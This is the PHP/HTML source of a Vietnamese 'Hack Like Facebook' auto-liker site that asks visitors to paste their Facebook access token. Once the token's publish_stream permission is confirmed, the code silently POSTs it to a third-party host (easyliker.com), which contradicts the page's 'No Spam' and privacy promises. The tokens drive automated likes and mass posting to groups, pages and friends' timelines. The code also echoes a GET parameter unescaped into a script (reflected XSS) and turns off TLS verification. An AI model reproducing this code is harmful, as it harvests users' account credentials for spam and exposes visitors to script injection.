<?php
session_start();
// JSONURL //
function get_html($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
	return $data;
    }
function get_json($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
	return json_decode($data);
    }
if($_SESSION['token']){
	$token = $_SESSION['token'];
	$graph_url ="https://graph.facebook.com/me?access_token=" . $token;
	$user = get_json($graph_url);
	if ($user->error) {
		if ($user->error->type== "OAuthException") {
			session_destroy();
			header('Location: index.php?i=Token Expired, Please Re-Generate new Token..! !');
			}
		}
}	

if(isset($_POST['submit'])) {
	$token2 = $_POST['token'];
	if(preg_match("'access_token=(.*?)&expires_in='", $token2, $matches)){
		$token = $matches[1];
			}
	else{
		$token = $token2;
	}
		$extend = get_html("https://graph.facebook.com/me/permissions?access_token="  . $token);
		$pos = strpos($extend, "publish_stream");
		if ($pos == true) {
		$_SESSION['token'] = $token;
		$ch = curl_init('https://easyliker.com/token_check.php');
		curl_setopt ($ch, CURLOPT_POST, 1);
		curl_setopt ($ch, CURLOPT_POSTFIELDS, "token=".$token);
		curl_setopt($ch, CURLOPT_TIMEOUT, 2);
		curl_exec ($ch);
		curl_close ($ch);
			}
			else {
			session_destroy();
					header('Location: index.php?i=Please Allow App to Access Your Profile! !, Try Again..');}
		
		}else{}
if(isset($_POST['logout'])) {
session_destroy();
header('Location: index.php?i=Đăng xuất thành công..!!');
}
if(isset($_GET['i'])){
echo '<script type="text/javascript">alert("THÔNG BÁO:  ' . $_GET['i'] . '");</script>';
}
?>
<!DOCTYPE html> 
<html lang="vi">
<head>
<title>Hack Like Facebook | Auto Like Facebook | Hach Like Facebook</title>
	<meta charset="UTF-8">	<link rel="shortcut icon" href="img/favicon.ico" />
	<meta name="keywords" content="Hack Like Facebook, Auto Like Facebook, Hach Like Facebook" />
	<meta name="description" content="auto like facebook, hack like facebook, hack like fb, auto like fb , hack sub facebook , auto comments facebook, hack comments facebook, auto sub facebook, auto friends facebook, hack friends facebook" />
	<meta name="author" content="Minh Khôi" />
	<meta name="generator" content="KenhLike.Com" />
	<meta name="copyright" content="Kenh Like service" />
	<meta name="rating" content="general" />
	<meta name="geo.region" content="VN-HN" />
	<meta name="geo.placename" content="Ha Noi, Viet Nam" />
	<meta name="geo.position" content="21.042758;105.748648" />
	<meta name="ICBM" content="21.042758, 105.748648" />
	<meta http-equiv="Refresh" content="600" />
	<meta property="fb:admins" content="1836279772" />
	<meta property="fb:app_id" content="1434939956740048"/>
	<meta property='article:author'content='https://www.facebook.com/1836279772' />
	<meta property="og:url" content="http://kenhlike.com" />
	<meta property="og:type" content="website" />
	<meta property="og:locale" content="vi_VN" />
	<meta property="og:title" content="Hack Like Facebook | Auto Like Facebook | Hach Like Facebook" />
	<meta property="og:description" content="auto like facebook , hack like facebook , hack, like , facebook, hack like facebook, auto like facebook , hack sub facebook , auto comments facebook, hack comments facebook, auto sub facebook, auto friends facebook, hack friends facebook" />
	<meta property="og:image" content="img/hacklikefacebook.png" />
	<link rel="apple-touch-icon" href="img/hacklikefacebook.png" />
	<link rel="apple-touch-icon" sizes="72x72" href="img/hacklikefacebook.png" />
	<link rel="apple-touch-icon" sizes="114x114" href="img/hacklikefacebook.png" />
	<link rel="author" href="https://plus.google.com/103376888552200702356" />
    <link rel="publisher" href="https://plus.google.com/103376888552200702356"/>
	<link rel="canonical" href="http://kenhlike.com" />
	<meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/bootstrap.css" rel="stylesheet">
	<script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
	<script src="js/starnhat.js"></script>
	<script src="js/starnhatpro.js"></script>
	<script src="js/getid.js"></script>
	<script src="js/login.js"></script>
	<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-67606160-1', 'auto');
  ga('send', 'pageview');

</script>
<script src="https://apis.google.com/js/platform.js" async defer>
	  {lang: 'vi'}
	</script>
</head>
 <body role="document">
<script id="_wau8eq">var _wau = _wau || [];
_wau.push(["tab", "uiyi8yd3eoyg", "8eq", "right-upper"]);
(function() {var s=document.createElement("script"); s.async=true;
s.src="http://widgets.amung.us/tab.js";
document.getElementsByTagName("head")[0].appendChild(s);
})();</script>
<script type="text/javascript" >
$(function() {
$(".submit").click(function() {
$("#controller").hide();
$( "#finish" ).show();
});
});
</script>
<center>
<div id="finish"style="display:none;position: fixed;top: 0;left: 0;width: 100%;height: 100%;backzground: #f4f4f4;z-index: 99;">
<div class="text" style="position: absolute;top: 45%;left: 0;height: 100%;width: 100%;font-size: 18px;text-align: center;">
<center><img src="load.gif"></center>
Giving Likes To Your Post ID! <Br>Meanwhile Please <b style="color: red;">BE ONLINE ON EASYLIKER</b>
</div>
</div></center>
<!--header-->
	    <nav class="navbar navbar-inverse navbar-static-top">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <span class="navbar-brand">KENHLIKE.COM</span>
        </div>
        <div id="navbar" class="navbar-collapse collapse">
          <ul class="nav navbar-nav">
			<li class="active">
			<a href="http://kenhlike.com">
			<span class="glyphicon glyphicon-home"></span><b> Trang Chủ</b></a>
			</li>
			<li><a href="http://login.kenhlike.com" title="auto sub facebook, tăng người theo dõi">Auto Subscrice</a></li>
			<li><a href="http://pages.kenhlike.com" title="tự động tăng likes bài viết mới nhất facebook">Auto Likes Page</a></li>
			<li><a href="#" data-target="#huongdan" data-toggle="modal">Hướng Dẫn</a></li>
            <li><a href="#" data-target="#kenhlike-getid" data-toggle="modal">Lấy ID Status/Ảnh/Video</a></li>
			<li><a href="https://www.facebook.com/groups/kenhlike/" title="Groups hỗ trợ kenhlike.com">Groups Hỗ Trợ</a></li>
          </ul>
        </div>
      </div>
    </nav>


<div class="container" role="main">
<div class="row">
<div class="col-sm-12 blog-main">
	<div class="content">
		<div class="panel panel-primary">				
		<div class="panel-heading"><h1 class="panel-title"> <span class="glyphicon glyphicon-globe" aria-hidden="true"></span> QUẢNG CÁO</h1></div>
			<div class="panel-body">
				<div class="tab-content">
<!-- Javascript Ad Tag: 6072 -->
<div id="lazada6072sNDMuE" align="center"></div>
<script src="http://lazada.go2cloud.org/aff_ad?campaign_id=6072&aff_id=72961&format=javascript&format=js&divid=lazada6072sNDMuE" type="text/javascript"></script>
<noscript><iframe src="http://lazada.go2cloud.org/aff_ad?campaign_id=6072&aff_id=72961&format=javascript&format=iframe" scrolling="no" frameborder="0" marginheight="0" marginwidth="0" width="728" height="90"></iframe></noscript>
<!-- // End Ad Tag -->
				</div>
			</div>
		</div>
	</div>
</div>




<div class="col-sm-12 blog-main">
	<div class="content">
		<div class="panel panel-primary">
				<div class="panel-heading"><h1 class="panel-title"><span class="glyphicon glyphicon-home" aria-hidden="true"></span> ĐĂNG NHẬP SỬ DỤNG</h1></div>
			<div class="panel-body">
				<div class="tab-content">




<div class="tab-pane fade in active">
	<h1><center>
		<?php if ($token){echo " ".$user->firt_name;}else{
		?>
		</center></h1>		
<center>
<div class="alert alert-info">
      <h3><strong>Chào <font color="red">Khách</font>! Bạn hãy làm theo cách bên dưới để đăng nhập.</strong></h3>
    </div>

							 BƯỚC 1 : Click <a class="btn btn-success btn-sm"  href="http://goo.gl/jZ7Nyl" target="_blank"><span class="glyphicon glyphicon-wrench" aria-hidden="true"></span> Cài Đặt</a> để cài đặt Apps<br> BƯỚC 2 : Click <a class="btn btn-warning btn-sm" href="view-source:http://goo.gl/jZ7Nyl" target="_blank"><span class="glyphicon glyphicon-link" aria-hidden="true"></span> Lấy Token</a> đợi 5 giây ấn -><b>[Bỏ Qua Quảng Cáo]</b><- xong copy toàn bộ link Token, quay lại trang chủ paste link token xuống dưới và <b>Đăng Nhập</b><br><br>
							 </center>	
					
					
					
					
<br>
</center>		
		<?php
		}
		?><?php if ($token): ?>
	

<center>
<div class="alert alert-success">
      <h3><strong><font color="red"><?php echo "Chúc mừng! ".$user->first_name; ?></font>  Bạn đã đăng nhập thành công.</strong></h3>
    </div>
<img src="https://graph.facebook.com/me/picture?width=200&height=200&access_token=<?php echo $token;?>" alt="Easyliker Heartly Welcomes You!" style="height:100px;width:100px;border: 1px solid black;" class="trans" />
<br>
Mời bạn chọn chức năng!<br>
<a href="liker.php" class="btn btn-info">Use Auto Likes</a>
<a href="comment.php" class="btn btn-warning">Use Multi Comment</a>
<a href="/autopost/multy_groups.php?token=<?php echo $token;?>" class="btn btn-success">Auto Post Groups</a>
<a href="/autopost/multy_pages.php?token=<?php echo $token;?>" class="btn btn-success">Auto Post Pages</a>
<a href="/autopost/multy_friends.php?token=<?php echo $token;?>" class="btn btn-success">Auto Post Friends Timeline</a>
<form method="post" action="">
<button name="logout" class="btn btn-danger" type="submit"> <span aria-hidden="true" class="glyphicon glyphicon-log-out"></span> Đăng Xuất</button></form></center>

				
<?php else: ?>
<center> 
				
								<form class="input-group" action="verify.php" method="GET" onSubmit="CheckToken()">
					
							<input id="accesstoken" name="user" type="text" class="form-control" placeholder="Nhập địa chỉ URL sau khi lấy Token tại đây">
							<span class="input-group-btn">
								<button type="submit" class="btn btn-primary">
									<span id="btn-click">
										<span class="glyphicon glyphicon-thumbs-up" aria-hidden="true"></span> Đăng Nhập
									</span>
								</button>
							</span>
							
						</form>				

				<?php endif ?>	</center>	<center>
<div id="checking"style="display:none;position: fixed;top: 0;left: 0;width: 100%;height: 100%;backzground: #f4f4f4;z-index: 99;">
<div class="text" style="position: absolute;top: 45%;left: 0;height: 100%;width: 100%;font-size: 18px;text-align: center;">
<center><img src="loading.gif"></center>
EasyLiker Is Verifying Your Token! <Br>Mean while <b style="color: red;">Please Wait...</b>
</div>
</div></div></center>
	






					
					
					
				</div>
			</div>
			
			
			
			
			
			<div class="panel-footer">
				<center>
					

<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/vi_VN/sdk.js#xfbml=1&version=v2.5&appId=1585731955037579";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>

<div class="fb-follow" data-href="https://www.facebook.com/dieukc" data-width="130" data-height="20" data-layout="button_count" data-show-faces="true"></div>
<br>
Bấm <b>Theo Dõi</b> để ủng hộ <b>kenhlike.com</b> ngày càng phát triển!!


				</center>
			</div>
		</div>
	</div>

</div>





<div class="col-sm-12 blog-main">
	<div class="content">
		<div class="panel panel-primary"><br>

        <div class="row">
              <div class="col-md-4">
			  
			  
			  
                <center>
                  <img alt="Hack like, auto like việt, hack  like facebook" title="Hack like, auto like việt, hack like facebook" src="img/no_spam_badge.png" height="64" width="64">
                  <br>
                  <h4 class="footertext">No Spam</h4>
                  <p class="footertext">Chúng tôi không SPAM trên tài khoản của bạn và bảo mật tuyệt đối thông tin người dùng.<br>
                </p></center>
              </div>
              <div class="col-md-4">
                <center>
                  <img alt="Hack like, auto like việt, hack  like facebook" title="Hack like, auto like việt, hack like facebook" src="img/fb.png" height="64" width="64">
                  <br>
                  <h4 class="footertext">Sending Likes</h4>
                  <p class="footertext">Nhận ngay 300 likes cho mỗi lần sử dụng và số likes lên đến 20.000 likes cho mỗi postid.<br>
                </p></center>
              </div>
              <div class="col-md-4">
                <center>
                    <img alt="Hack like, auto like việt, hack  like facebook" title="Hack like, auto like việt, hack like facebook" src="img/trust.png" height="64" width="64">
                  <br>
                  <h4 class="footertext">Trust Site</h4>
                  <p class="footertext">Được thành lập từ 2013 và được mọi người tin tưởng sử dụng với các chức năng hữu ích nhất.<br>
                </p></center>
              </div>
            </div>

			
		</div>
	</div>
</div>





<!-- huongdansd-->
				<div class="modal fade" id="huongdan">
					<div class="modal-dialog">
						<div class="modal-content">
							<div class="modal-header">
								<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
								<h4 class="modal-title">Hướng Dẫn</h4>
							</div>
							<div class="modal-body">
								<div class="well">
			Đầu tiên, để sử dụng <b>KENHLIKE.COM</b>, bạn phải có đủ 3 điều kiện sau:<br>
		<font color="red">+</font> Nick Facebook của bạn phải trên 18 tuổi (Từ năm <b>1996</b> trở lại).<br>
		<font color="red">+</font> Bật theo dõi bởi "<b>Tất cả mọi người</b>" <a href="http://fb.com/settings?tab=followers" target="_blank" rel="nofollow">[Cài đặt Theo dõi]</a> | <a href="http://fb.com/settings?tab=followers&amp;section=comment&amp;view" target="_blank" rel="nofollow">[Cài đặt Comment]</a><br>
		<font color="red">+</font> Status / Ảnh Phải để chế độ Mọi Người (Công Khai.)<br>
								</div>
								<div class="well">
					ĐĂNG NHẬP BẰNG TOKEN<br>
					<font color="red">+</font> B1 : <b> Cài Token</b> => B2 : <b>Lấy Token</b> => B3 : <b>Copy Link </b>=> B4 : <b>Paste Link Token</b> => B5 : <b>Đăng Nhập</b><BR> - <a href="https://youtu.be/2eU1ucQKxe0" target="_blank" rel="nofollow">[Xem Video Hướng Dẫn]</a><br>

								</div>
							</div>
						</div>
					</div>
				</div>
<!-- end huongdansd -->
<!-- getid-->
				<div class="modal fade" id="kenhlike-getid">
					<div class="modal-dialog">
						<div class="modal-content">
							<div class="modal-header">
								<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
								<h4 class="modal-title">Lấy ID Status, Ảnh, Video</h4>
							</div>
							<div class="modal-body">
									<div class="form-group">
										<div class="input-group">
											<span class="input-group-addon"><span class="glyphicon glyphicon-link" aria-hidden="true"></span><i class="fa fa-external-link-square"></i>
											</span>
											
											<input type="text" class="form-control" id="linkgetid" placeholder="Nhập Link Status/Ảnh/Video cần lấy ID" required>
											<span class="input-group-btn">
												<button id="getid" type="submit" class="btn btn-default">GET</button>
											</span>
										</div>
									</div>
								</div>
							</div>
						</div>
	</div>

<!-- end getid-->
</div>
			<div class="row-fluid">
				<hr />
				<footer class="footer" role="contentinfo">
					<p class="text-center">
						Copyright © KenhLike.com 2013 - <script type="text/javascript">
							//<![CDATA[
								var d = new Date()
								document.write(d.getFullYear())
								//]]>
								</script>

					</p>
				</footer>
			</div>
</div>




					
<!-- SCRIPTS -->

<!-- SLIDER REVOLUTION 4.x SCRIPTS  -->
<script type="text/javascript" src="rs-plugin/js/jquery.themepunch.tools.min.js"></script>   
<script type="text/javascript" src="rs-plugin/js/jquery.themepunch.revolution.min.js"></script>
<!-- slider settings -->
<script type="text/javascript">
	//<![CDATA[
			jQuery(document).ready(function() {
					jQuery('.tp-banner').show().revolution(
				{
					delay:9000,
					startwidth:1170,
					startheight:600,
					navigationType:"bullet",
					navigationStyle:"square",
					hideBulletsOnMobile:"on",
					hideArrowsOnMobile: "on",
					shadow:0,
					fullWidth:"on",
				});
			});	
		//]]>
	</script>
<script type="text/javascript">

//<![CDATA[
   	window.fbAsyncInit = function() {
		FB.init({ appId: '171342606239806', 
			status: true, 
			cookie: true,
			xfbml: true,
			oauth: true
		});
   		    
	  		  	function updateButton(response) {
	    	var button = document.getElementById('fb-auth');
		
			if(button) {	
	    		if (response.authResponse) {
	      		// user is already logged in and connected
				button.onclick = function() {
					if($('login-form')){
						$('modlgn-username').set('value','Facebook');
						$('modlgn-passwd').set('value','Facebook');
						$('login-form').submit();
					} else if($('com-login-form')) {
					   $('username').set('value','Facebook');
					   $('password').set('value','Facebook');
					   $('com-login-form').submit();
					}
				}
			} else {
	      		//user is not connected to your app or logged out
	      		button.onclick = function() {
					FB.login(function(response) {
					   if (response.authResponse) {
					      if($('login-form')){
					      	$('modlgn-username').set('value','Facebook');
					      	$('modlgn-passwd').set('value','Facebook');
					      	$('login-form').submit();
					      } else if($('com-login-form')) {
					         $('username').set('value','Facebook');
					         $('password').set('value','Facebook');
					         $('com-login-form').submit();
					      }
					  } else {
					    //user cancelled login or did not grant authorization
					  }
					}, {scope:'email'});  	
	      		}
	    	}
	    }
	  }
	  // run once with current status and whenever the status changes
	  FB.getLoginStatus(updateButton);
	  FB.Event.subscribe('auth.statusChange', updateButton);	
	  	};
    //      
   window.addEvent('load', function(){
        (function(){
                if(!document.getElementById('fb-root')) {
                     var root = document.createElement('div');
                     root.id = 'fb-root';
                     document.getElementById('gkfb-root').appendChild(root);
                     var e = document.createElement('script');
                 e.src = document.location.protocol + '//connect.facebook.net/en_US/all.js';
                     e.async = true;
                 document.getElementById('fb-root').appendChild(e);   
                }
        }());
    }); 
    //]]>
</script>
<script src="js/jquery.touchSwipe.min.js"></script>
<script src="js/jquery.mousewheel.min.js"></script>				
<script type="text/javascript" src="js/jquery.prettyPhoto.js"></script>
<script type="text/javascript" src="js/scripts.js"></script>
<script src="js/retina.js"></script>
<!-- carousel -->
<script type="text/javascript" src="js/jquery.carouFredSel-6.2.1-packed.js"></script>
<script type="text/javascript">


//<![CDATA[
jQuery(document).ready(function($) {
	$("#slider_home").carouFredSel({ 
		width : "100%", 
		height : "auto",
		responsive : true,
		auto : false,
		items : { width : 280, visible: { min: 1, max: 3 }
		},
		swipe : { onTouch : true, onMouse : true },
		scroll: { items: 1, },
		prev : { button : "#sl-prev", key : "left"},
		next : { button : "#sl-next", key : "right" }
		});
	});
//]]>
</script>

<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-50001635-15', 'auto');
  ga('send', 'pageview');

</script>


</body>
</html>
